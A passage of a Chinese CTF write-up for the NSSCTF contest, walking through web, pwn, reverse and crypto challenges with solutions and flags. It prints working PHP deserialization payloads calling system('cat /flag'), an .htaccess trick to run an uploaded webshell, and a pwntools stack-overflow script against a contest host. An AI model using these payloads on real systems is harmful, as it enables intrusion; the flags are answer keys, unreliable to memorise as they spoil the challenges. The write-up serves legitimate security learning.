echo serialize($h1);</code></pre>
<p>wake绕一下</p>
<pre><code class="hljs plaintext">O:2:&quot;lt&quot;:3:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:5:&quot;title&quot;;s:9:&quot;cat /flag&quot;;&#125;s:4:&quot;md51&quot;;s:7:&quot;QNKCDZO&quot;;s:4:&quot;md52&quot;;s:9:&quot;240610708&quot;;&#125;
O:2:&quot;lt&quot;:4:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:5:&quot;title&quot;;s:9:&quot;cat /flag&quot;;&#125;s:4:&quot;md51&quot;;s:7:&quot;QNKCDZO&quot;;s:4:&quot;md52&quot;;s:9:&quot;240610708&quot;;&#125;
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271748068.png?x-oss-process=hzy" alt="image-20221027174832991"></p>
<p>NSSCTF{c34c5909-45ed-4d1d-b952-4e7deeda8303}</p>
<h2 id="1z_unserialize">1z_unserialize</h2>
<p>基础反序列化</p>
<pre><code class="hljs plaintext">&lt;?php
 
class lyh&#123;
    public $url = &#x27;NSSCTF.com&#x27;;
    public $lt;
    public $lly;
     
     function  __destruct()
     &#123;
        $a = $this-&gt;lt;

        $a($this-&gt;lly);
     &#125;
    
    
&#125;
unserialize($_POST[&#x27;nss&#x27;]);
highlight_file(__FILE__);
 
 
?&gt;</code></pre>
<p>执行函数即可</p>
<pre><code class="hljs plaintext">&lt;?php
 
class lyh&#123;
    public $url = &#x27;NSSCTF.com&#x27;;
    public $lt=&#x27;system&#x27;;
    public $lly=&#x27;cat /flag&#x27;;
     
     function  __destruct()
     &#123;
        $a = $this-&gt;lt;

        $a($this-&gt;lly);
     &#125;
    
    
&#125;
$h = new lyh();
echo serialize($h);
 
 
?&gt;</code></pre>
<pre><code class="hljs plaintext">O:3:&quot;lyh&quot;:3:&#123;s:3:&quot;url&quot;;s:10:&quot;NSSCTF.com&quot;;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:9:&quot;cat /flag&quot;;&#125;</code></pre>
<p>NSSCTF{d47de8b5-018d-4f6e-8158-b4df1f552db9}</p>
<h2 id="webdog1__start">webdog1__start</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291850708.png?x-oss-process=hzy" alt="image-20220929185047647"></p>
<p>扫目录</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291850503.png?x-oss-process=hzy" alt="image-20220929185056401"></p>
<p>Robots.txt</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291851029.png?x-oss-process=hzy" alt="image-20220929185108975"></p>
<p>访问f14g.php</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291851440.png?x-oss-process=hzy" alt="image-20220929185121386"></p>
<p>看源码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271110682.png?x-oss-process=hzy" alt="image-20221027111018620"></p>
<p>md5绕过，科学计数法即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271112716.png?x-oss-process=hzy" alt="image-20221027111249663"></p>
<p>0e215962017</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271114846.png?x-oss-process=hzy" alt="image-20221027111401779"></p>
<p>这个前面扫目录也看到了是robots.txt</p>
<p>访问f14g.php</p>
<p>抓包得到hint</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271115669.png?x-oss-process=hzy" alt="image-20221027111529602"></p>
<p>访问F1l1l1l1l1lag.php得到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271116089.png?x-oss-process=hzy" alt="image-20221027111610034"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271117022.png?x-oss-process=hzy" alt="image-20221027111747960"></p>
<p>读取的话进行了过滤，使用编码的tab绕过</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271122995.png?x-oss-process=hzy" alt="image-20221027112237938"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271123452.png?x-oss-process=hzy" alt="image-20221027112309393"></p>
<p>NSSCTF{c1a46c1f-b61e-41ca-a90e-b7c80ca82da9}</p>
<h2 id="ez_upload">Ez_upload</h2>
<blockquote>
<p>简单的文件上传</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271124408.png?x-oss-process=hzy" alt="image-20221027112403352"></p>
<p>fuzz发现支持图片上传，好像也过滤了一些字符</p>
<p>基本思路就是先上传编码马然后上传.htaccess文件对应上传的编码马，这个时候发现是只能上传jpg图片</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271131665.png?x-oss-process=hzy" alt="image-20221027113103170"></p>
<p>前端绕过上传配置文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271134137.png?x-oss-process=hzy" alt="image-20221027113443051"></p>
<pre><code class="hljs plaintext">&lt;FilesMatch &quot;2.jpg&quot;&gt;
 SetHandler application/x-httpd-php
php://filter/convert.base64-decode/resource=/var/www/html/upload/1654f692bf439e0c78420bde48dca5b0/2.jpg
&lt;/FilesMatch&gt;</code></pre>
<p>然后访问传的马就可以看到flag了</p>
<h2 id="numgame">numgame</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271137118.png?x-oss-process=hzy" alt="image-20221027113735049"></p>
<p>发现源代码看不了，自己加前缀view-source:</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271138496.png?x-oss-process=hzy" alt="image-20221027113847419"></p>
<p>进js文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271139850.png?x-oss-process=hzy" alt="image-20221027113904792"></p>
<p>解码得到NsScTf.php，继续访问</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271139619.png?x-oss-process=hzy" alt="image-20221027113946561"></p>
<p>调用类的静态方法的方法，类名::方法名</p>
<blockquote>
<p>使用php对类名方法名大小写不敏感进行绕过关键词</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271141819.png?x-oss-process=hzy" alt="image-20221027114120752"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271141016.png?x-oss-process=hzy" alt="image-20221027114132958"></p>
<p>NSSCTF{b06953ef-afd1-47d8-8930-6745f0d2544e}</p>
<h2 id="ez_rce">ez_rce</h2>
<p>打开界面是这样</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291851343.png?x-oss-process=hzy" alt="image-20220929185159277"></p>
<p>Dirsearch扫一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291852505.png?x-oss-process=hzy" alt="image-20220929185208385"></p>
<p>查看robots.txt</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291852037.png?x-oss-process=hzy" alt="image-20220929185218972"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291852399.png?x-oss-process=hzy" alt="image-20220929185225329"></p>
<p>好家伙，tp5.0，找cve</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291852515.png?x-oss-process=hzy" alt="image-20220929185238454"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291852502.png?x-oss-process=hzy" alt="image-20220929185245442"></p>
<p><a href="https://blog.csdn.net/YouthBelief/article/details/120954775">(62条消息) thinkphp漏洞复现_YouthBelief的博客-CSDN博客_thinkphp漏洞复现</a></p>
<p>不能直接cat，那就写入shell，也写不进去(这地方不是不能cat，是那个/flag就没有内容)</p>
<p>Find一下找找</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291852122.png?x-oss-process=hzy" alt="image-20220929185259068"></p>
<p>找到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291853230.png?x-oss-process=hzy" alt="image-20220929185308179"></p>
<p>NSSCTF{c8442f7f-ca60-48e8-b321-88e5dcb76df9}</p>
<h2 id="xff">Xff</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291853052.png?x-oss-process=hzy" alt="image-20220929185329000"></p>
<p>先是xff本地</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291853782.png?x-oss-process=hzy" alt="image-20220929185339723"></p>
<p>然后加referer本地，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291853661.png?x-oss-process=hzy" alt="image-20220929185349593"></p>
<p>Flag: NSSCTF{th1s_xff_1s_e4ay}</p>
<h2 id="js_sign">js_sign</h2>
<blockquote>
<p>真的只是js吗</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271810179.png?x-oss-process=hzy" alt="image-20221027181049097"></p>
<p>找到main.js</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210271811712.png?x-oss-process=hzy" alt="image-20221027181137652"></p>
<pre><code class="hljs plaintext">document.getElementsByTagName(&quot;button&quot;)[0].addEventListener(&quot;click&quot;, ()=&gt;&#123;
    flag=&quot;33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15&quot;
    if (btoa(flag.value) == &#x27;dGFwY29kZQ==&#x27;) &#123;
        alert(&quot;you got hint!!!&quot;);
    &#125; else &#123;
        alert(&quot;fuck off !!&quot;);
    &#125;    
&#125;)</code></pre>
<p>输出tap code解码得到flag</p>
<p>NSSCTF{youfindflagbytapcode}</p>
<h2 id="ez_ez_unserialize">ez_ez_unserialize</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
class X
&#123;
    public $x = __FILE__;
    function __construct($x)
    &#123;
        $this-&gt;x = $x;
    &#125;
    function __wakeup()
    &#123;
        if ($this-&gt;x !== __FILE__) &#123;
            $this-&gt;x = __FILE__;
        &#125;
    &#125;
    function __destruct()
    &#123;
        highlight_file($this-&gt;x);
        //flag is in fllllllag.php
    &#125;
&#125;
if (isset($_REQUEST[&#x27;x&#x27;])) &#123;
    @unserialize($_REQUEST[&#x27;x&#x27;]);
&#125; else &#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p>exp如下</p>
<pre><code class="hljs plaintext">&lt;?php
class X
&#123;
    public $x =&#x27;fllllllag.php&#x27;;
    
&#125;

$h = new X();
$flag = serialize($h);
echo $flag;
//O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210281807476.png?x-oss-process=hzy" alt="image-20221028180726334"></p>
<p>NSSCTF{722389cb-4e74-4b0c-b884-7d07ffc32d4b}</p>
<p>后面三道不想写了(其实是我太菜了)</p>
<h1 id="pwn">PWN</h1>
<h2 id="does-your-nc-work">Does your nc work？</h2>
<p>顾名思义</p>
<p>NSSCTF{fcecd94b-a330-4118-9fde-b40bdcd9243a}</p>
<h2 id="有手就行的栈溢出">有手就行的栈溢出</h2>
<p>基础栈溢出</p>
<pre><code class="hljs plaintext">from pwn import *

p = remote(&#x27;1.14.71.254&#x27;,28367)

#p = process(&#x27;./pwn&#x27;)

payload = b&#x27;a&#x27;*40+p64(0x401257)

p.sendline(payload)

p.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291854966.png?x-oss-process=hzy" alt="image-20220929185436897"></p>
<p>NSSCTF{04eda8d6-e5ae-4ffc-b037-75458bddafba}</p>
<h1 id="re">RE</h1>
<h2 id="babyre">Babyre</h2>
<p>Ida打开就能看到</p>
<p>NSSCTF{this_is_the_first_flag}</p>
<h2 id="easyre">Easyre</h2>
<p>同上</p>
<p>NSSCTF{oh_you_find_it}</p>
<h2 id="xor">Xor</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291855864.png?x-oss-process=hzy" alt="image-20220929185503782"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291855938.png?x-oss-process=hzy" alt="image-20220929185517877"></p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=857">异或运算加密/解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p>
<p>NSSCTF{XOR_1s_good_way_to_encrypt_flag}</p>
<h2 id="base64">base64</h2>
<p>base64解码得到NSSCTF{base_64_NTWQ4ZGDNC7N}</p>
<h2 id="base64-2">base64-2</h2>
<p>还是base64，只不过换码表了</p>
<pre><code class="hljs plaintext">import base64

table=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;

table_changed=&quot;NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/&quot;

s=&#x27;GyAGD1ETr3AcGKNkZ19PLKAyAwEsAIELHx1nFSH2IwyGsD==&#x27;

res=&quot;&quot;

for c in s:

  res+=table[table_changed.find(c)]   

print(base64.b64decode(res))   
</code></pre>
<p>NSSCTF{siMp13_Base64_5TXRMZHU6V9S}</p>
<h2 id="upx">Upx</h2>
<p>Upx壳，脱壳后</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291856203.png?x-oss-process=hzy" alt="image-20220929185603136"></p>
<p>异或加密，解密得到flag</p>
<p>NSSCTF{UPX_1s_xord_way_to_encrypt_flag}</p>
<h2 id="贪吃蛇">贪吃蛇</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291856731.png?x-oss-process=hzy" alt="image-20220929185617672"></p>
<p>NSSCTF{YourAreTheMasterOfGame!}</p>
<h1 id="crypto">Crypto</h1>
<h2 id="yafu分解">yafu分解</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">from gmpy2 import invert
from Crypto.Util.number import getPrime, bytes_to_long
from flag import getflag

e = 65537
p = getPrime(140)
q = getPrime(140)
n = p * q
phiN = (p - 1) * (q - 1)
d = invert(e, phiN)
m = bytes_to_long(getflag().encode())
c = pow(m, e, n)
print(&quot;n=&quot; + str(n))
print(&quot;c=&quot; + str(c))
#n=1851012829537540993346897265450988006921329733937556249710137670254755668838970157221
#c=1165608868963663237838494928147497339359377331987999335624507621030816298293537918937
</code></pre>
<p>知道n，c，e</p>
<p>yafu爆破得到p，q</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210231625361.png?x-oss-process=hzy" alt="image-20221023162524973"></p>
<pre><code class="hljs plaintext">P43 = 1358730637766188714476624560503309609820513
P43 = 1362310363870711901033415700690289289304517</code></pre>
<p>脚本一把梭</p>
<pre><code class="hljs plaintext">import libnum
from Crypto.Util.number import long_to_bytes
 
n=1851012829537540993346897265450988006921329733937556249710137670254755668838970157221
c=1165608868963663237838494928147497339359377331987999335624507621030816298293537918937

#n = int(&quot;&quot;,16)
e = 65537
#e = int(&quot;&quot;,16)

p = 1358730637766188714476624560503309609820513
q = 1362310363870711901033415700690289289304517


 
d = libnum.invmod(e, (p - 1) * (q - 1))
m = pow(c, d, n)  
string = long_to_bytes(m) 
print(string)  
//b&#x27;AFFPGS&#123;snzv1l_ov9_gur_g0_Jr1p0zr&#125;&#x27;</code></pre>
<p>rot13解码得到flag</p>
<p>NSSCTF{fami1y_bi9_the_t0_We1c0me}</p>
<h2 id="welcome-to-modern-cryptography">Welcome to Modern Cryptography</h2>
<p>rsa，在线网站直接解了</p>
<p><a href="https://oktools.net/rsa">RSA加密、RSA解密 - 在线工具 - OKTools</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210231632403.png?x-oss-process=hzy" alt="image-20221023163203284"></p>
<p>NSSCTF{9b28603c-1d61-4a51-9e37-dfb939bd0e81}</p>
<h2 id="善哉善哉">善哉善哉</h2>
<blockquote>
<p>善斋善哉，出题人以慈悲为怀</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210281818878.png?x-oss-process=hzy" alt="image-20221028181845802"></p>
<p>打开看看在最后找到了摩斯</p>
<pre><code class="hljs plaintext">--..-.--.--..../-..----.-.--.--/--..--.----..../--------...--.-./-...-.-.-----.../-..-.--.-.---.../-.-....---..---/-..-.--..-..--.-/-..-.-.--.-..--./-.-.-....----.-/-...-.-.-----.../-..-.-.--.-..--./-..-.--..-....../--..-...--.-..-/-..-.--.-.---.../-.-....---..---/-------..----.-/-....-.--.-.-..-/-..-.-.--.-..--./-.-.--.-.-..-../-..-.--..-..--.-/--..-.--.-.----/-.-.-..-.-..-../-..--.......-.../-..-.-.--.-..--./-.....-..---..-./-.-.--....--.-./-.-.--......---/-.-..-------.--/-..-.-.--.-..--./-.--..-..--.---/-.-.-.--.....--/-.-.-..--...--./-.-.--.-.--.-../-.-.-....--.--./-.....-----.-..-/-.....-.---..-.-/-.-.--......---/-.........-.-.../-.-.-..-..-..-./-..-.-.--.-..--./--....-....--.-/-..-.-.--.-..--./-.-.--.--..-..-/-.........-.-.../--...-..-....../-.-.--.-.-..-../-..-.-.--.-..--./-.-.--......---/-..-.-.--.-..--./-..-.--..-..--.-/-..-.--..-....../-.-..-------.--/--------....-.-/-.--.---.-...--/-.-.-....----.-/---.---..-----./-..-.--...------/--....-....--.-/-.....-----.-..-/-..-------.---./-.-------....--/-..-.--..-..--.-/-.-..-------.--/-..-.--..-....../-.-.--.-.-..-../-.-.-....----.-/-....---...---../-.-.-....--.--./--..-.--.-.----/-..-.-.--.-..--./-.-.--....--.-./--....-....--.-/-.-.-....----.-/-.....-.---..-.-/-.--.---.-...--/-.-.-..--...--./-.....-..---..-./-.--....-.----./-.-.--.--..-..-/-..----....----/-.-.--......---/--....-....--.-/-..-.--..-..--.-/-.-.--......---/-.-.-....----.-/-..-.-.---..--.-/-.-...-.-.---../-.-.-.--.----../-.--..--.....-.</code></pre>
<p>解码得到</p>
<pre><code class="hljs plaintext">新 佛 曰 ： 諸 隸 僧 降 閦 吽 諸 閦 陀 摩 隸 僧 缽 薩 閦 嚤 降 斯 咤 須 閦 色 嘚 嘇 叻 閦 夷 喃 哆 嚴 吶 菩 若 嘇 耨 咒 閦 愍 閦 囉 耨 所 嚤 閦 嘇 閦 降 陀 叻 羅 宣 吽 眾 阿 愍 菩 修 心 降 叻 陀 嚤 吽 蜜 吶 斯 閦 嘚 愍 吽 若 宣 哆 色 塞 囉 伏 嘇 愍 降 嘇 吽 闍 兜 喼 如</code></pre>
<p>新与佛论禅</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210281820578.png?x-oss-process=hzy" alt="image-20221028182059471"></p>
<p>在图片属性找到线索</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210281821693.png?x-oss-process=hzy" alt="image-20221028182127626"></p>
<p>得到flag</p>
<p>NSSCTF{7551772a99379ed0ae6015a470c1e335}</p>
<h2 id="什锦">什锦</h2>
<p>附件给了一个图片两个文本</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210281823561.png?x-oss-process=hzy" alt="image-20221028182344345"></p>
<p>猪圈密码</p>
<p>brainfuck解密</p>
<pre><code class="hljs plaintext">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&gt;&gt;&gt;++++++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++&gt;++&lt;&lt;&lt;&lt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&gt;&gt;++++++++++&lt;&lt;-]&gt;&gt;-&lt;&lt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++